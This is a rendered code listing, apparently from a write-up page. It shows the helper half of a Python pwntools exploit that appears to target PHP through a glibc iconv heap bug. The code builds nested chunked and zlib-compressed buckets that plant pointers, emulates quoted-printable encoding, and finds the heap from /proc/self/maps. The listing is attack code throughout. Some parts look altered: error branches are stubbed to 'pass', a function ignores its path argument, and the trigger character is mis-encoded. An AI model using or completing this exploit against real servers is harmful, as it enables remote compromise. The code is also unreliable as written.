</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span><span class=lnt>216
</span><span class=lnt>217
</span><span class=lnt>218
</span><span class=lnt>219
</span><span class=lnt>220
</span><span class=lnt>221
</span><span class=lnt>222
</span><span class=lnt>223
</span><span class=lnt>224
</span><span class=lnt>225
</span><span class=lnt>226
</span><span class=lnt>227
</span><span class=lnt>228
</span><span class=lnt>229
</span><span class=lnt>230
</span><span class=lnt>231
</span><span class=lnt>232
</span><span class=lnt>233
</span><span class=lnt>234
</span><span class=lnt>235
</span><span class=lnt>236
</span><span class=lnt>237
</span><span class=lnt>238
</span><span class=lnt>239
</span><span class=lnt>240
</span><span class=lnt>241
</span><span class=lnt>242
</span><span class=lnt>243
</span><span class=lnt>244
</span><span class=lnt>245
</span><span class=lnt>246
</span><span class=lnt>247
</span><span class=lnt>248
</span><span class=lnt>249
</span><span class=lnt>250
</span><span class=lnt>251
</span><span class=lnt>252
</span><span class=lnt>253
</span><span class=lnt>254
</span><span class=lnt>255
</span><span class=lnt>256
</span><span class=lnt>257
</span><span class=lnt>258
</span><span class=lnt>259
</span><span class=lnt>260
</span><span class=lnt>261
</span><span class=lnt>262
</span><span class=lnt>263
</span><span class=lnt>264
</span><span class=lnt>265
</span><span class=lnt>266
</span><span class=lnt>267
</span><span class=lnt>268
</span><span class=lnt>269
</span><span class=lnt>270
</span><span class=lnt>271
</span><span class=lnt>272
</span><span class=lnt>273
</span><span class=lnt>274
</span><span class=lnt>275
</span><span class=lnt>276
</span><span class=lnt>277
</span><span class=lnt>278
</span><span class=lnt>279
</span><span class=lnt>280
</span><span class=lnt>281
</span><span class=lnt>282
</span><span class=lnt>283
</span><span class=lnt>284
</span><span class=lnt>285
</span><span class=lnt>286
</span><span class=lnt>287
</span><span class=lnt>288
</span><span class=lnt>289
</span><span class=lnt>290
</span><span class=lnt>291
</span><span class=lnt>292
</span><span class=lnt>293
</span><span class=lnt>294
</span><span class=lnt>295
</span><span class=lnt>296
</span><span class=lnt>297
</span><span class=lnt>298
</span><span class=lnt>299
</span><span class=lnt>300
</span><span class=lnt>301
</span><span class=lnt>302
</span><span class=lnt>303
</span><span class=lnt>304
</span><span class=lnt>305
</span><span class=lnt>306
</span><span class=lnt>307
</span><span class=lnt>308
</span><span class=lnt>309
</span><span class=lnt>310
</span><span class=lnt>311
</span><span class=lnt>312
</span><span class=lnt>313
</span><span class=lnt>314
</span><span class=lnt>315
</span><span class=lnt>316
</span><span class=lnt>317
</span><span class=lnt>318
</span><span class=lnt>319
</span><span class=lnt>320
</span><span class=lnt>321
</span><span class=lnt>322
</span><span class=lnt>323
</span><span class=lnt>324
</span><span class=lnt>325
</span><span class=lnt>326
</span><span class=lnt>327
</span><span class=lnt>328
</span><span class=lnt>329
</span><span class=lnt>330
</span><span class=lnt>331
</span><span class=lnt>332
</span><span class=lnt>333
</span><span class=lnt>334
</span><span class=lnt>335
</span><span class=lnt>336
</span><span class=lnt>337
</span><span class=lnt>338
</span><span class=lnt>339
</span><span class=lnt>340
</span><span class=lnt>341
</span><span class=lnt>342
</span><span class=lnt>343
</span><span class=lnt>344
</span><span class=lnt>345
</span><span class=lnt>346
</span><span class=lnt>347
</span><span class=lnt>348
</span><span class=lnt>349
</span><span class=lnt>350
</span><span class=lnt>351
</span><span class=lnt>352
</span><span class=lnt>353
</span><span class=lnt>354
</span><span class=lnt>355
</span><span class=lnt>356
</span><span class=lnt>357
</span><span class=lnt>358
</span><span class=lnt>359
</span><span class=lnt>360
</span><span class=lnt>361
</span><span class=lnt>362
</span><span class=lnt>363
</span><span class=lnt>364
</span><span class=lnt>365
</span><span class=lnt>366
</span><span class=lnt>367
</span><span class=lnt>368
</span><span class=lnt>369
</span><span class=lnt>370
</span><span class=lnt>371
</span><span class=lnt>372
</span><span class=lnt>373
</span><span class=lnt>374
</span><span class=lnt>375
</span><span class=lnt>376
</span><span class=lnt>377
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/python</span>
</span></span><span class=line><span class=cl><span class=c1># -*- coding: utf-8 -*-</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>dataclasses</span> <span class=kn>import</span> <span class=n>dataclass</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>zlib</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>binascii</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>HEAP_SIZE</span> <span class=o>=</span> <span class=mi>2</span> <span class=o>*</span> <span class=mi>1024</span> <span class=o>*</span> <span class=mi>1024</span>
</span></span><span class=line><span class=cl><span class=n>BUG</span> <span class=o>=</span> <span class=s2>&#34;åŠ„&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s2>&#34;utf-8&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@dataclass</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Region</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;A memory region.&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>start</span><span class=p>:</span> <span class=nb>int</span>
</span></span><span class=line><span class=cl>    <span class=n>stop</span><span class=p>:</span> <span class=nb>int</span>
</span></span><span class=line><span class=cl>    <span class=n>permissions</span><span class=p>:</span> <span class=nb>str</span>
</span></span><span class=line><span class=cl>    <span class=n>path</span><span class=p>:</span> <span class=nb>str</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nd>@property</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>size</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=bp>self</span><span class=o>.</span><span class=n>stop</span> <span class=o>-</span> <span class=bp>self</span><span class=o>.</span><span class=n>start</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>print_hex</span><span class=p>(</span><span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>hex_string</span> <span class=o>=</span> <span class=n>binascii</span><span class=o>.</span><span class=n>hexlify</span><span class=p>(</span><span class=n>data</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>hex_string</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>chunked_chunk</span><span class=p>(</span><span class=n>data</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>,</span> <span class=n>size</span><span class=p>:</span> <span class=nb>int</span> <span class=o>=</span> <span class=kc>None</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Constructs a chunked representation of the given chunk. If size is given, the
</span></span></span><span class=line><span class=cl><span class=s2>    chunked representation has size `size`.
</span></span></span><span class=line><span class=cl><span class=s2>    For instance, `ABCD` with size 10 becomes: `0004</span><span class=se>\n</span><span class=s2>ABCD</span><span class=se>\n</span><span class=s2>`.
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># The caller does not care about the size: let&#39;s just add 8, which is more than</span>
</span></span><span class=line><span class=cl>    <span class=c1># enough</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>size</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>size</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>)</span> <span class=o>+</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl>    <span class=n>keep</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>)</span> <span class=o>+</span> <span class=nb>len</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>size</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>)</span><span class=si>:</span><span class=s2>x</span><span class=si>}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=n>size</span> <span class=o>-</span> <span class=n>keep</span><span class=p>,</span> <span class=s2>&#34;0&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>size</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=n>data</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>compressed_bucket</span><span class=p>(</span><span class=n>data</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Returns a chunk of size 0x8000 that, when dechunked, returns the data.&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>chunked_chunk</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=mh>0x8000</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>compress</span><span class=p>(</span><span class=n>data</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Returns data suitable for `zlib.inflate`.
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># Remove 2-byte header and 4-byte checksum</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>zlib</span><span class=o>.</span><span class=n>compress</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=mi>9</span><span class=p>)[</span><span class=mi>2</span><span class=p>:</span><span class=o>-</span><span class=mi>4</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>ptr_bucket</span><span class=p>(</span><span class=o>*</span><span class=n>ptrs</span><span class=p>,</span> <span class=n>size</span><span class=o>=</span><span class=kc>None</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Creates a 0x8000 chunk that reveals pointers after every step has been ran.&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>size</span> <span class=ow>is</span> <span class=ow>not</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>assert</span> <span class=nb>len</span><span class=p>(</span><span class=n>ptrs</span><span class=p>)</span> <span class=o>*</span> <span class=mi>8</span> <span class=o>==</span> <span class=n>size</span>
</span></span><span class=line><span class=cl>    <span class=n>bucket</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>map</span><span class=p>(</span><span class=n>p64</span><span class=p>,</span> <span class=n>ptrs</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>bucket</span> <span class=o>=</span> <span class=n>qpe</span><span class=p>(</span><span class=n>bucket</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>bucket</span> <span class=o>=</span> <span class=n>chunked_chunk</span><span class=p>(</span><span class=n>bucket</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>bucket</span> <span class=o>=</span> <span class=n>chunked_chunk</span><span class=p>(</span><span class=n>bucket</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>bucket</span> <span class=o>=</span> <span class=n>chunked_chunk</span><span class=p>(</span><span class=n>bucket</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>bucket</span> <span class=o>=</span> <span class=n>compressed_bucket</span><span class=p>(</span><span class=n>bucket</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>bucket</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>qpe</span><span class=p>(</span><span class=n>data</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Emulates quoted-printable-encode.
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;=</span><span class=si>{</span><span class=n>x</span><span class=si>:</span><span class=s2>02x</span><span class=si>}</span><span class=s2>&#34;</span> <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=n>data</span><span class=p>)</span><span class=o>.</span><span class=n>upper</span><span class=p>()</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>b64</span><span class=p>(</span><span class=n>data</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>,</span> <span class=n>misalign</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>misalign</span> <span class=ow>and</span> <span class=n>payload</span><span class=o>.</span><span class=n>endswith</span><span class=p>(</span><span class=s2>&#34;=&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>ValueError</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Misaligned: </span><span class=si>{</span><span class=n>data</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>payload</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>_get_region</span><span class=p>(</span><span class=n>regions</span><span class=p>,</span> <span class=o>*</span><span class=n>names</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Returns the first region whose name matches one of the given names.&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>region</span> <span class=ow>in</span> <span class=n>regions</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>any</span><span class=p>(</span><span class=n>name</span> <span class=ow>in</span> <span class=n>region</span><span class=o>.</span><span class=n>path</span> <span class=k>for</span> <span class=n>name</span> <span class=ow>in</span> <span class=n>names</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>region</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>find_main_heap</span><span class=p>(</span><span class=n>regions</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># Any anonymous RW region with a size superior to the base heap size is a</span>
</span></span><span class=line><span class=cl>    <span class=c1># candidate. The heap is at the bottom of the region.</span>
</span></span><span class=line><span class=cl>    <span class=n>heaps</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=n>region</span><span class=o>.</span><span class=n>stop</span> <span class=o>-</span> <span class=n>HEAP_SIZE</span> <span class=o>+</span> <span class=mh>0x40</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>region</span> <span class=ow>in</span> <span class=nb>reversed</span><span class=p>(</span><span class=n>regions</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>region</span><span class=o>.</span><span class=n>permissions</span> <span class=o>==</span> <span class=s2>&#34;rw-p&#34;</span>
</span></span><span class=line><span class=cl>        <span class=ow>and</span> <span class=n>region</span><span class=o>.</span><span class=n>size</span> <span class=o>&gt;=</span> <span class=n>HEAP_SIZE</span>
</span></span><span class=line><span class=cl>        <span class=ow>and</span> <span class=n>region</span><span class=o>.</span><span class=n>stop</span> <span class=o>&amp;</span> <span class=p>(</span><span class=n>HEAP_SIZE</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>        <span class=ow>and</span> <span class=n>region</span><span class=o>.</span><span class=n>path</span> <span class=o>==</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>heaps</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>first</span> <span class=o>=</span> <span class=n>heaps</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>heaps</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>heaps</span> <span class=o>=</span> <span class=s2>&#34;, &#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>map</span><span class=p>(</span><span class=nb>hex</span><span class=p>,</span> <span class=n>heaps</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Potential heaps: &#34;</span> <span class=o>+</span> <span class=n>heaps</span> <span class=o>+</span> <span class=s2>&#34; (using first)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># print(&#34;[*]Using &#34; + hex(first) + &#34; as heap&#34;)</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>first</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_regions</span><span class=p>(</span><span class=n>maps_path</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Obtains the memory regions of the PHP process by querying /proc/self/maps.&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>f</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;maps&#39;</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>maps</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>PATTERN</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>compile</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=sa>r</span><span class=s2>&#34;^([a-f0-9]+)-([a-f0-9]+)\b&#34;</span> <span class=sa>r</span><span class=s2>&#34;.*&#34;</span> <span class=sa>r</span><span class=s2>&#34;\s([-rwx]</span><span class=si>{3}</span><span class=s2>[ps])\s&#34;</span> <span class=sa>r</span><span class=s2>&#34;(.*)&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>regions</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>region</span> <span class=ow>in</span> <span class=n>maps</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=c1># print(region)</span>
</span></span><span class=line><span class=cl>        <span class=k>match</span> <span class=o>=</span> <span class=n>PATTERN</span><span class=o>.</span><span class=k>match</span><span class=p>(</span><span class=n>region</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=k>match</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>start</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=k>match</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>),</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>stop</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=k>match</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>2</span><span class=p>),</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>permissions</span> <span class=o>=</span> <span class=k>match</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>path</span> <span class=o>=</span> <span class=k>match</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=s2>&#34;/&#34;</span> <span class=ow>in</span> <span class=n>path</span> <span class=ow>or</span> <span class=s2>&#34;[&#34;</span> <span class=ow>in</span> <span class=n>path</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>path</span> <span class=o>=</span> <span class=n>path</span><span class=o>.</span><span class=n>rsplit</span><span class=p>(</span><span class=s2>&#34; &#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>)[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>path</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>            <span class=n>current</span> <span class=o>=</span> <span class=n>Region</span><span class=p>(</span><span class=n>start</span><span class=p>,</span> <span class=n>stop</span><span class=p>,</span> <span class=n>permissions</span><span class=p>,</span> <span class=n>path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>regions</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>current</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># print(&#34;[*]Unable to parse memory mappings&#34;)</span>
</span></span><span class=line><span class=cl>            <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># print(&#34;[*]Got &#34; + str(len(regions)) + &#34; memory regions&#34;)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>regions</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
